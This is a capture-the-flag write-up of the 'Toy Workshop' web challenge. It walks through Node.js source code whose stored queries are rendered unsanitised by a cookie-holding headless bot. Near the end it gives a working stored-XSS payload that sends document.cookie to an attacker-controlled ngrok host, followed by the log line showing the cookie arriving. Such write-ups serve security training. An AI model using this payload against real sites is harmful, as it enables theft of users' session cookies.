# Toy Workshop
> Web Challenge (XSS)


### Webpage 
![[Pasted image 20211207193848.png]]

From the webpage, we can see there's a form that we can send query to.

### Source Code
Route.js

``` js
router.post('/api/submit', async (req, res) => {


	const { query } = req.body;

	if(query){

		return db.addQuery(query)

	.then(() => {

		bot.readQueries(db);

		res.send(response('Your message is delivered successfully!'));

	});

}

	return res.status(403).send(response('Please write your query first!'));

});

  

router.get('/queries', async (req, res, next) => {

	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()

	.then(queries => {

	res.render('queries', { queries });

})

	.catch(() => res.status(500).send(response('Something went wrong!')));

});

```

Interesting thing here are we have 2 path
- /api/submit
	In here, we can add query and the **bot.js** will fetch the queries for us

- /queries
	here, only **127.0.0.1** is allowed to access, so we couldn't access the webpage. (maybe XFF can ? Tried but no luck)

Bot.js
```js
const cookies = [{

	'name': 'flag',

	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'

}];

  
  

const readQueries = async (db) => {

const browser = await puppeteer.launch(browser_options);

let context = await browser.createIncognitoBrowserContext();

let page = await context.newPage();

	await page.goto('http://127.0.0.1:1337/');

	await page.setCookie(...cookies);

	await page.goto('http://127.0.0.1:1337/queries', {

	waitUntil: 'networkidle2'

});

	await browser.close();

	await db.migrate();

};
```
From this, we can see it calls readQueries and add the **flag** to the cookie. Our goal is to get the cookie.

Database.js
```js
async addQuery(query) {

	return new Promise(async (resolve, reject) => {

try {

	let stmt = await this.db.prepare('INSERT INTO queries (query) VALUES (?)');

	resolve(await stmt.run(query));

} catch(e) {

	reject(e);

}

});

}

  

async getQueries() {

	return new Promise(async (resolve, reject) => {

try {

	let stmt = await this.db.prepare('SELECT * FROM queries');

	resolve(await stmt.all());

} catch(e) {

	reject(e);

}

});

}

```
As we can see, the database addQuery and getQueries does not perform any data validation/sanitization, hence we can perform XSS and let it executes in bot.js

### Set up ngrok

``` command
Forwarding                    

http://9bf6-2001-e68-5404-8ff2-13a0-ad52-bbb2-45fa.ngrok.io -> http://localhost:80                                                               
Forwarding                    
https://9bf6-2001-e68-5404-8ff2-13a0-ad52-bbb2-45fa.ngrok.io -> http://localhost:80   
```
We use ngrok to expose our localhost webpage to public so that the bot.js can access it.

### Payload
```js
<script>document.location='http://9bf6-2001-e68-5404-8ff2-13a0-ad52-bbb2-45fa.ngrok.io/?='+document.cookie </script>
```
For the payload, we change the document location to our webpage from ngrok then we concatenate the **cookie** at the end of the url and we are able to obtain the flag !

``` command
127.0.0.1 - - [07/Dec/2021 19:36:20] "GET /?=flag=HTB{f4k3_fl4g_f0r_t3st1ng} HTTP/1.1" 200
```
